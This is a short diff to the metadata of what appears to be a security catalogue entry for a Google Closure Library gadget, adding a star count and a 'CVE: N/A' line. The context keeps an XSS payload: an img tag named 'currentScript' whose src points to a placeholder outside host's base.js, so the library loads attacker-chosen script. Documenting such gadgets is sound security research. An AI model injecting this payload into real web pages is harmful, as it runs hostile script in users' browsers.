@@ -3,9 +3,11 @@
 ### Meta
 
 + Library: Google Closure Library
++ Stars: 4.9K
 + Version: v20230103
 + Payload: ```<img name="currentScript" src="https://xxx.xxx.xxx/base.js"></img>```
 + Impact: XSS
++ CVE: N/A
 + Foundby: TheHulk
 
 
